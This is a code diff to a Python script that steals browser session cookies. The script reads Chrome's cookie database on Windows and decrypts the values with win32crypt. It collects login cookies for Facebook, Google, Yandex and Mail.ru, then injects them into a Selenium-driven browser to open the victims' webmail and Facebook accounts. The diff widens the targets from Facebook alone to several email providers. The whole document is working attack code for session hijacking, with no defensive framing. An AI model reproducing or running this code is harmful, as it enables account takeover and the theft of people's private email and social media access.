@@ -4,8 +4,13 @@ r_source = r"""
 import sqlite3
 import win32crypt
 
-directory = {
-    'facebook.com': ('datr', 'c_user', 'xs'),
+urls = {
+    '.facebook.com': ('datr', 'c_user', 'xs'),
+    '.yandex.com': (),
+    '.yandex.ru': (),
+    '.mail.ru': (),
+    '.google.com': (),
+    'accounts.google.com': (),
 }
 
 
@@ -19,17 +24,15 @@ with connection:
     values = v.fetchall()
 
     for info in values:
-        if directory.has_key(info[0][1:]):
-            if info[1] in directory[info[0][1:]]:
-                host = info[0]
-                name = info[1]
-                value = win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1]
-                key = 'chrome-{}'.format(host)
-                sessions.append({
-                        'domain': host,
-                        'name': name,
-                        'value': value,
-                    })
+        if info[0] in urls:
+            host = info[0]
+            name = info[1]
+            value = win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1]
+            sessions.append({
+                    'domain': host,
+                    'name': name,
+                    'value': value,
+                })
 
 mprint = sessions
 """
@@ -50,17 +53,32 @@ def chrome_sessions(sessions):
 
     cookies = sessions
 
+    urls = {
+        u'.facebook.com': u'https://www.facebook.com',
+        u'.mail.ru': u'https://e.mail.ru',
+        u'.yandex.com': u'https://mail.yandex.com',
+        u'.yandex.ru': u'https://mail.yandex.ru',
+        u'.yandex.ru': u'https://mail.yandex.ru',
+        u'.google.com': u'https://mail.google.com',
+        u'accounts.google.com': u'https://mail.google.com',
+    }
+
     driver_chrome = webdriver.Firefox()
-    driver_chrome.get("http://facebook.com")
-    for cookie in cookies:
-        driver_chrome.add_cookie(cookie)
-    time.sleep(1)
-    driver_chrome.get("http://facebook.com")
 
+    l = []
+    for dics in cookies:
+        l.append(dics['domain'])
+    domains = set(l)
+    for domain in domains:
+        driver_chrome.get(urls[domain])
+        for cookie in cookies:
+            if cookie['domain'] == domain:
+                driver_chrome.add_cookie(cookie)
+        driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')
 
-    # New Tab
-    # driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')
-    # driver_chrome.get('http://facebook.com/')
+    for i in range(len(domains)+1):
+        driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + str(i))
+        driver_chrome.refresh()
 
 
 chrome_sessions(sessions)
